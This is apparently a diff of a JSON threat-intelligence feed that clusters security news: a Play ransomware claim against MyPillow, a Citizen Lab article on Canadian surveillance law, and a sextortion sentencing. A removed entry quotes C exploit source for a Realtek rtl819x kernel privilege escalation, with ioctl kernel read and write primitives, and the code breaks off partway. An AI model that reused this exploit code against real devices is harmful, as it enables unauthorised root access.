the deadline for payment listed by Play on its leak portal is reached tomorrow. When the deadline passes, the data will either appear or it won't. And if it doesn't appear, then chances are that either the attackers don't have any MyPillow data at all, or they have been given a strong incentive (most commonly financial) to not release it after all. What would be a mistake, however, is for MyPillow to think that saying \"we don't hold sensitive data on our own systems\" provides a strong defence. That's because it tell you where data lives, not whether it is safe. Modern businesses hand customer records, payroll, and financial information to a wide variety of third parties - payment processors, fulfilment partners, HR and payroll providers, CRM and email platforms, cloud hosts. Each of those systems can be breached, and attacks increasingly go after such suppliers precisely because a single hack can serve up data belonging to many organisations. And from the perspective of the people whose data could potentially be at risk - such as customers, employees, and business partners - the distinction is largely academic. If your name, address, payment details, or tax information ends up on a ransomware gang's leak site, it makes little practical difference whether it was siphoned from MyPillow's own servers or from a contractor acting on its behalf. Outsourcing the storage and processing of data doesn't mean your business's reputation won't be tarnished if a security breach occurs, and it certainly doesn't mean that the consequences for the individuals affected won't be just as serious. We'll know soon enough whether Friday's payment deadline from the Play ransomware group brings a data dump or a quiet anticlimax. One thing is certain - ransomware gangs target anyone they think might pay, and strong defences are needed by all organisations. tags Industry News Author Graham CLULEY Graham Cluley is an award-winning security blogger, researcher and public speaker. He has been working in the computer security industry since the early 1990s. View all posts You might also like Bookmarks",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion"
-          ],
-          "actor_attribution": [
-            "Play"
-          ],
-          "affected_industries": [
-            "financial_services",
-            "government",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_3_analysis",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Graham Cluley",
-          "cohort": "practitioner_analysis",
-          "title": "MyPillow listed on ransomware gang’s leak site, but denies it has been breached",
-          "link": "https://www.bitdefender.com/en-us/blog/hotforsecurity/mypillow-ransomware-leak-site-denies-breach",
-          "published": "2026-05-28T13:39:39+00:00",
-          "summary": "A notorious ransomware gang claims to have stolen MyPillow's private data, but CEO Mike Lindell calls it a politically motivated \"hit job.\" With the countdown ticking toward a massive dark web leak, who is telling the truth? Read more in my article on the Hot for Security blog.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion"
-            ],
-            "actor_attribution": [
-              "Play"
-            ],
-            "affected_industries": [
-              "financial_services",
-              "government",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_3_analysis",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "47b2954a67",
       "priority_score": 11,
       "member_count": 1,
@@ -6874,6 +7028,105 @@
               "npm": "target",
               "Cisco": "target"
             },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "1521771637",
+      "priority_score": 11,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [
+          "Play"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "government",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_3_analysis"
+        ]
+      },
+      "primary": {
+        "source": "Graham Cluley",
+        "cohort": "practitioner_analysis",
+        "title": "MyPillow listed on ransomware gang’s leak site, but denies it has been breached",
+        "link": "https://www.bitdefender.com/en-us/blog/hotforsecurity/mypillow-ransomware-leak-site-denies-breach",
+        "published": "2026-05-28T13:39:39+00:00",
+        "summary": "A notorious ransomware gang claims to have stolen MyPillow's private data, but CEO Mike Lindell calls it a politically motivated \"hit job.\" With the countdown ticking toward a massive dark web leak, who is telling the truth? Read more in my article on the Hot for Security blog.",
+        "full_body": "Industry News 2 min read MyPillow listed on ransomware gang's leak site, but denies it has been breached Graham CLULEY May 28, 2026 The Play ransomware gang is claiming to have stolen data from US pillow manufacturer MyPillow, making off with private and personal confidential data. The claim, which appeared on Play's dark web leak portal earlier this week, threatens that an undeclared amount of data will be released on Friday, potentially exposing \"private and personal confidential data, clients and etc. documents,budget, payroll, IDs, taxes, finance information.\" However, since Straight Arrow News , which first reported details of the alleged ransomware attack, the pillow manufacturers high-profile CEO Mike Lindell has debunked the claims that any security breach has happened at all. Lindell - a high-profile supporter of US President Donald Trump who is currently seeking the Republican nomination for governor of his home state, Minnesota - told Straight Arrow News that he was not aware that any claims had been made about an alleged attack on his company until he was contacted by the press. Furthermore, Lindell says that the claims being made about a ransomware attack are politically motivated: “This is another hit job by outside sources because I'm running for governor. I guarantee it. We do not have any breaches in our data at all.\" Lindell further said that his company had not received any ransomware demands, and that the company does not store any sensitive data internally, relying upon external third parties instead. Whether MyPillow was actually breached is, at the time of writing, unconfirmed. The company denies it has been hit, and the Play ransomware gang claims otherwise. The truth is likely to emerge quickly, as the deadline for payment listed by Play on its leak portal is reached tomorrow. When the deadline passes, the data will either appear or it won't. And if it doesn't appear, then chances are that either the attackers don't have any MyPillow data at all, or they have been given a strong incentive (most commonly financial) to not release it after all. What would be a mistake, however, is for MyPillow to think that saying \"we don't hold sensitive data on our own systems\" provides a strong defence. That's because it tell you where data lives, not whether it is safe. Modern businesses hand customer records, payroll, and financial information to a wide variety of third parties - payment processors, fulfilment partners, HR and payroll providers, CRM and email platforms, cloud hosts. Each of those systems can be breached, and attacks increasingly go after such suppliers precisely because a single hack can serve up data belonging to many organisations. And from the perspective of the people whose data could potentially be at risk - such as customers, employees, and business partners - the distinction is largely academic. If your name, address, payment details, or tax information ends up on a ransomware gang's leak site, it makes little practical difference whether it was siphoned from MyPillow's own servers or from a contractor acting on its behalf. Outsourcing the storage and processing of data doesn't mean your business's reputation won't be tarnished if a security breach occurs, and it certainly doesn't mean that the consequences for the individuals affected won't be just as serious. We'll know soon enough whether Friday's payment deadline from the Play ransomware group brings a data dump or a quiet anticlimax. One thing is certain - ransomware gangs target anyone they think might pay, and strong defences are needed by all organisations. tags Industry News Author Graham CLULEY Graham Cluley is an award-winning security blogger, researcher and public speaker. He has been working in the computer security industry since the early 1990s. View all posts You might also like Bookmarks",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion"
+          ],
+          "actor_attribution": [
+            "Play"
+          ],
+          "affected_industries": [
+            "financial_services",
+            "government",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_3_analysis",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Graham Cluley",
+          "cohort": "practitioner_analysis",
+          "title": "MyPillow listed on ransomware gang’s leak site, but denies it has been breached",
+          "link": "https://www.bitdefender.com/en-us/blog/hotforsecurity/mypillow-ransomware-leak-site-denies-breach",
+          "published": "2026-05-28T13:39:39+00:00",
+          "summary": "A notorious ransomware gang claims to have stolen MyPillow's private data, but CEO Mike Lindell calls it a politically motivated \"hit job.\" With the countdown ticking toward a massive dark web leak, who is telling the truth? Read more in my article on the Hot for Security blog.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [
+              "Play"
+            ],
+            "affected_industries": [
+              "financial_services",
+              "government",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_3_analysis",
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -7296,6 +7549,87 @@
       ]
     },
     {
+      "cluster_id": "1895290fc3",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Citizen Lab",
+        "cohort": "threat_research_primary",
+        "title": "Trump Wants to Tap Your Phone. Ottawa Might Let Him.",
+        "link": "https://citizenlab.ca/trump-wants-to-tap-your-phone-ottawa-might-let-him/",
+        "published": "2026-05-25T16:10:31+00:00",
+        "summary": "Senior research associate Kate Robertson discusses the risks Bill C-22 poses for future data-sharing agreements with foreign law enforcement agencies. The post Trump Wants to Tap Your Phone. Ottawa Might Let Him. appeared first on The Citizen Lab .",
+        "full_body": "Date Published May 25, 2026 Topics Law & Policy Mass Surveillance bill c-22 , surveillance Mentions Kate Robertson Share Senior research associate Kate Robertson writes for The Walrus about the potential implications of Canada’s proposed Bill C-22 for future data-sharing agreements with foreign law enforcement agencies. While the legislation would give Ottawa broad new powers to compel technology providers to build surveillance capabilities into their systems, it would also “move the ball up the field towards a CLOUD Act agreement” with the United States. The CLOUD Act, currently being negotiated between the two countries behind closed doors, “could give agencies like the FBI the power to carry out real-time surveillance including wiretaps and phone hacking in Canada.” Despite concerns about the “serious threat” to the rule of law in the United States, the Canadian government has “not yet signaled any reluctance to strike a deal, despite the turmoil south of the border,” says Robertson. Although surveillance law reform has been a top issue for the U.S. in trade negotiations, the Canadian government has not provided an explanation about why the U.S. is pressuring Canada to pass these reforms. “In the absence of public transparency,” Robertson writes, “observers are left to read between the lines.” Read the article More in: Law & Policy LATEST Location data collected from mobile apps and digital advertising can reveal habits, interests and almost any other aspect of someone’s life. In this report, we uncover how a geolocation surveillance system called Webloc uses ad-based data to monitor hundreds of millions of people across the globe. April 9, 2026 Mass Surveillance Targeted Surveillance News + Updates → In the Media Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill MAY 14, 2026 event Civil Society Summit on the AI Industry MAY 14, 2026 News + Updates → News Ron Deibert Speaks at the OSCE Supplementary Human Dimension Meeting II MAY 13, 2026",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [
+            "government"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Citizen Lab",
+          "cohort": "threat_research_primary",
+          "title": "Trump Wants to Tap Your Phone. Ottawa Might Let Him.",
+          "link": "https://citizenlab.ca/trump-wants-to-tap-your-phone-ottawa-might-let-him/",
+          "published": "2026-05-25T16:10:31+00:00",
+          "summary": "Senior research associate Kate Robertson discusses the risks Bill C-22 poses for future data-sharing agreements with foreign law enforcement agencies. The post Trump Wants to Tap Your Phone. Ottawa Might Let Him. appeared first on The Citizen Lab .",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "0c964a73a7",
       "priority_score": 10,
       "member_count": 1,
@@ -7553,87 +7887,6 @@
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_1_government",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "1895290fc3",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [
-          "government"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Citizen Lab",
-        "cohort": "threat_research_primary",
-        "title": "Trump Wants to Tap Your Phone. Ottawa Might Let Him.",
-        "link": "https://citizenlab.ca/trump-wants-to-tap-your-phone-ottawa-might-let-him/",
-        "published": "2026-05-25T16:10:31+00:00",
-        "summary": "Senior research associate Kate Robertson discusses the risks Bill C-22 poses for future data-sharing agreements with foreign law enforcement agencies. The post Trump Wants to Tap Your Phone. Ottawa Might Let Him. appeared first on The Citizen Lab .",
-        "full_body": "Date Published May 25, 2026 Topics Law & Policy Mass Surveillance bill c-22 , surveillance Mentions Kate Robertson Share Senior research associate Kate Robertson writes for The Walrus about the potential implications of Canada’s proposed Bill C-22 for future data-sharing agreements with foreign law enforcement agencies. While the legislation would give Ottawa broad new powers to compel technology providers to build surveillance capabilities into their systems, it would also “move the ball up the field towards a CLOUD Act agreement” with the United States. The CLOUD Act, currently being negotiated between the two countries behind closed doors, “could give agencies like the FBI the power to carry out real-time surveillance including wiretaps and phone hacking in Canada.” Despite concerns about the “serious threat” to the rule of law in the United States, the Canadian government has “not yet signaled any reluctance to strike a deal, despite the turmoil south of the border,” says Robertson. Although surveillance law reform has been a top issue for the U.S. in trade negotiations, the Canadian government has not provided an explanation about why the U.S. is pressuring Canada to pass these reforms. “In the absence of public transparency,” Robertson writes, “observers are left to read between the lines.” Read the article More in: Law & Policy LATEST Location data collected from mobile apps and digital advertising can reveal habits, interests and almost any other aspect of someone’s life. In this report, we uncover how a geolocation surveillance system called Webloc uses ad-based data to monitor hundreds of millions of people across the globe. April 9, 2026 Mass Surveillance Targeted Surveillance News + Updates → In the Media Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill MAY 14, 2026 event Civil Society Summit on the AI Industry MAY 14, 2026 News + Updates → News Ron Deibert Speaks at the OSCE Supplementary Human Dimension Meeting II MAY 13, 2026",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [
-            "government"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Citizen Lab",
-          "cohort": "threat_research_primary",
-          "title": "Trump Wants to Tap Your Phone. Ottawa Might Let Him.",
-          "link": "https://citizenlab.ca/trump-wants-to-tap-your-phone-ottawa-might-let-him/",
-          "published": "2026-05-25T16:10:31+00:00",
-          "summary": "Senior research associate Kate Robertson discusses the risks Bill C-22 poses for future data-sharing agreements with foreign law enforcement agencies. The post Trump Wants to Tap Your Phone. Ottawa Might Let Him. appeared first on The Citizen Lab .",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
             "role_map": {},
             "weak_tags": {
               "products": []
@@ -8263,9 +8516,7 @@
         "affected_industries": [],
         "affected_products": [],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-36355"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
@@ -8282,17 +8533,15 @@
         "link": "https://www.exploit-db.com/exploits/52580",
         "published": "2026-05-27T00:00:00+00:00",
         "summary": "Realtek rtl819x - Local Privilege",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Realtek rtl819x - Local Privilege EDB-ID: 52580 CVE: 2026-36355 EDB Verified: Author: Daniil Gordeev Type: local Exploit: / Platform: Linux Date: 2026-05-27 Vulnerable App: * Exploit Title: Realtek rtl819x - Local Privilege Escalation * Date: 2026-05-03 * Exploit Author: Daniil Gordeev * Vendor Homepage: http://www.realtek.com * Software Link: https://github.com/iptime-gpl/userapps_n104qi (representative GPL release) * Version: Realtek rtl819x Jungle SDK, all known versions through v3.4.14B * Tested on: Linux 3.18.48, ARMv7 Cortex-A7, Qualcomm MDM9607, rtl8192es.ko (MeiG FORGE_SLT711 / Ortel 4G LTE CPE) * CVE: CVE-2026-36355 * * kpwn - RTL8192CD kernel LPE exploit * * Exploits missing capability checks on ioctl 0x89F5/0x89F6 (write_mem/read_mem) * in the Realtek rtl819x out-of-tree WiFi driver SDK. * * Runs as ANY unprivileged user — no root needed at any stage. * Auto-detects task_struct offsets from init_task. * * Affected: ALL devices using Realtek rtl819x out-of-tree driver SDK * Chips: RTL8192C/D/E, RTL8188E, RTL8812, RTL8881A, RTL8197F, etc. * * Build: arm-linux-gnueabi-gcc -static -O2 -o tools/kpwn tools/kpwn.c * Usage: /tmp/kpwn (any user, GID 3003/inet on paranoid kernels) */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <errno.h> #include <dirent.h> #include <sys/ioctl.h> #include <sys/socket.h> #include <linux/wireless.h> #define IOCTL_WRITE 0x89F5 /* SIOCDEVPRIVATE+5: write_mem */ #define IOCTL_READ 0x89F6 /* SIOCDEVPRIVATE+6: read_mem */ /* kernel .data scan range for init_task (ARM, no KASLR) */ #define DATA_SCAN_START 0xC0800000 #define DATA_SCAN_END 0xC1000000 static int sockfd = -1; static int nioctls = 0; static char ifname[IFNAMSIZ]; /* ---- kernel R/W primitives ---- */ static int kread(unsigned long addr, void *out, int ndw) { struct iwreq wrq; char buf[256]; if (ndw > 32) ndw = 32; snprintf(buf, sizeof(buf), \"dw,%lx,%x\", addr, ndw); memset(&wrq, 0, sizeof(wrq)); strncpy(wrq.ifr_name, ifname, IFNAMSIZ); wrq.u.data.pointer = buf; wrq.u.data.length = strlen(buf) + 1; if (ioctl(sockfd, IOCTL_READ, &wrq) < 0) return -1; nioctls++; int n = wrq.u.data.length; if (n > 0 && out) memcpy(out, buf, n > 128 ? 128 : n); return n; } static unsigned int kread32(unsigned long addr) { unsigned int v = 0; kread(addr, &v, 1); return v; } static int kfill(unsigned long addr, int ndw, unsigned int val) { struct iwreq wrq; char buf[256]; snprintf(buf, sizeof(buf), \"dw,%lx,%x,%x\", addr, ndw, val); memset(&wrq, 0, sizeof(wrq)); strncpy(wrq.ifr_name, ifname, IFNAMSIZ); wrq.u.data.pointer = buf; wrq.u.data.length = strlen(buf) + 1; if (ioctl(sockfd, IOCTL_WRITE, &wrq) < 0) return -1; nioctls++; return 0; } /* ---- find vulnerable interface ---- */ static int find_interface(void) { DIR *d = opendir(\"/sys/class/net\"); if (!d) return -1; struct dirent *e; unsigned int probe; while ((e = readdir(d))) { if (e->d_name[0] == '.' || strcmp(e->d_name, \"lo\") == 0) continue; strncpy(ifname, e->d_name, IFNAMSIZ - 1); probe = 0; if (kread(0xC0008000, &probe, 1) > 0 && probe != 0) { closedir(d); return 0; } } closedir(d); return -1; } /* ---- resolve init_task ---- */ static unsigned long scan_for_init_task(void) { /* * Brute-force: scan kernel .data for init_task.comm = \"swapper\". * Validate by checking cred pointer (must dereference to uid=0, gid=0). * * The returned base doesn't need to be exact — detect_offsets finds * all field positions relative to the base, and the math in find_task * and the overwrite phase uses (base + offset) pairs where any constant * shift cancels out. We just need \"swapper\" to land within the * detect_offsets search window (0x200-0x5F0 from returned base). */ unsigned char buf[128]; unsigned long addr; printf(\"[*] Scanning .data for init_task...\\n\"); for (addr = DATA_SCAN_START; addr < DATA_SCAN_END; addr += 128) { if (kread(addr, buf, 32) <= 0) continue; int j; for (j",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [],
           "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-36355"
-          ],
+          "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "news_report",
@@ -8317,9 +8566,7 @@
             "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-36355"
-            ],
+            "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
@@ -8639,6 +8886,81 @@
       ]
     },
     {
+      "cluster_id": "e9775dc197",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "BleepingComputer",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Sextortionist sentenced to 33 years for targeting 145 children",
+        "link": "https://www.bleepingcomputer.com/news/security/sextortionist-sentenced-to-33-years-for-targeting-145-children/",
+        "published": "2026-05-28T09:25:59+00:00",
+        "summary": "A Canadian man was sentenced to 33 years in prison after pleading guilty to targeting more than 145 children across the United States, some as young as 6 years old, in an eight-year-long sextortion scheme. [...]",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Sextortionist sentenced to 33 years for targeting 145 children",
+          "link": "https://www.bleepingcomputer.com/news/security/sextortionist-sentenced-to-33-years-for-targeting-145-children/",
+          "published": "2026-05-28T09:25:59+00:00",
+          "summary": "A Canadian man was sentenced to 33 years in prison after pleading guilty to targeting more than 145 children across the United States, some as young as 6 years old, in an eight-year-long sextortion scheme. [...]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "2be6eea2c3",
       "priority_score": 10,
       "member_count": 1,
@@ -8702,81 +9024,6 @@
             "threat_categories": [
               "data_breach"
             ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "e9775dc197",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "BleepingComputer",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Sextortionist sentenced to 33 years for targeting 145 children",
-        "link": "https://www.bleepingcomputer.com/news/security/sextortionist-sentenced-to-33-years-for-targeting-145-children/",
-        "published": "2026-05-28T09:25:59+00:00",
-        "summary": "A Canadian man was sentenced to 33 years in prison after pleading guilty to targeting more than 145 children across the United States, some as young as 6 years old, in an eight-year-long sextortion scheme. [...]",
-        "full_body": "",
-        "fetch_status": "not_attempted",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "BleepingComputer",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Sextortionist sentenced to 33 years for targeting 145 children",
-          "link": "https://www.bleepingcomputer.com/news/security/sextortionist-sentenced-to-33-years-for-targeting-145-children/",
-          "published": "2026-05-28T09:25:59+00:00",
-          "summary": "A Canadian man was sentenced to 33 years in prison after pleading guilty to targeting more than 145 children across the United States, some as young as 6 years old, in an eight-year-long sextortion scheme. [...]",
-          "taxonomy": {
-            "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
@@ -9872,136 +10119,210 @@
           }
         }
       ]
-    },
-    {
-      "cluster_id": "303d851328",
-      "priority_score": 9,
-      "member_count": 2,
-      "corroborating_source_count": 1,
-      "strong_signals": [
-        "Google Cloud"
-      ],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [
-          "government"
-        ],
-        "affected_products": [
-          "Google Cloud"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_2_operator"
-        ]
-      },
-      "primary": {
-        "source": "Google Cloud Security",
-        "cohort": "cloud_identity_infrastructure",
-        "title": "Go from resource-level to business-level maintenance in Google Cloud",
-        "link": "https://cloud.google.com/blog/products/application-development/app-centric-maintenance-visibility-in-unified-maintenance/",
-        "published": "2026-05-28T16:00:00+00:00",
-        "summary": "Managing planned maintenance is a critical part of running a reliable business. But as your cloud footprint grows into hundreds or even thousands of projects, keeping track of every individual update can feel like a full-time job. For many platform teams, the reality is a disjointed experience: jumping between dashboards to figure out which maintenance event affects which business service. At Google Cloud, we believe you shouldn’t have to think like an infrastructure manager when you’re trying to solve a business problem. That’s why we are excited to announce the launch of App-centric maintenance visibility within Unified Maintenance . Shifting the focus to your business Until now, maintenance visibility was primarily resource-focused. You could see when a specific Compute Engine VM or Cloud SQL instance was due for an update, but you had to manually map those resources to the applications they powered. With App-centric visibility, we are shifting the focus from infrastructure-level re",
-        "full_body": "",
-        "fetch_status": "not_attempted",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Google Cloud"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_2_operator",
-          "role_map": {
-            "Google Cloud": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Google Cloud Security",
-          "cohort": "cloud_identity_infrastructure",
-          "title": "Go from resource-level to business-level maintenance in Google Cloud",
-          "link": "https://cloud.google.com/blog/products/application-development/app-centric-maintenance-visibility-in-unified-maintenance/",
-          "published": "2026-05-28T16:00:00+00:00",
-          "summary": "Managing planned maintenance is a critical part of running a reliable business. But as your cloud footprint grows into hundreds or even thousands of projects, keeping track of every individual update can feel like a full-time job. For many platform teams, the reality is a disjointed experience: jumping between dashboards to figure out which maintenance event affects which business service. At Google Cloud, we believe you shouldn’t have to think like an infrastructure manager when you’re trying to solve a business problem. That’s why we are excited to announce the launch of App-centric maintenance visibility within Unified Maintenance . Shifting the focus to your business Until now, maintenance visibility was primarily resource-focused. You could see when a specific Compute Engine VM or Cloud SQL instance was due for an update, but you had to manually map those resources to the applications they powered. With App-centric visibility, we are shifting the focus from infrastructure-level re",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Google Cloud"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "Google Cloud": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
     }
   ],
   "affinity_groups": [
     {
-      "label": "vulnerability disclosure targeting Microsoft BitLocker",
+      "label": "Kopia active exploitation",
       "dominant_features": {
         "threat_categories": [
-          "vulnerability_disclosure"
+          "active_exploitation",
+          "data_breach"
         ],
         "affected_products": [
-          "Microsoft BitLocker"
+          "Kopia",
+          "Gitea",
+          "Palo Alto Networks"
         ],
-        "cve_ids": [
-          "CVE-2026-41091",
-          "CVE-2026-45498"
+        "urgency_signals": [
+          "preauth_unauth",
+          "poc_available",
+          "critical_cvss",
+          "actively_exploited",
+          "no_patch_yet"
         ]
       },
-      "cluster_count": 2,
-      "article_count": 2,
-      "cohesion": 0.352,
+      "cluster_count": 4,
+      "article_count": 4,
+      "cohesion": 0.215,
       "shared_strong_signals": [
-        "CVE-2026-41091",
-        "CVE-2026-45498",
-        "Microsoft BitLocker"
+        "Kopia"
       ],
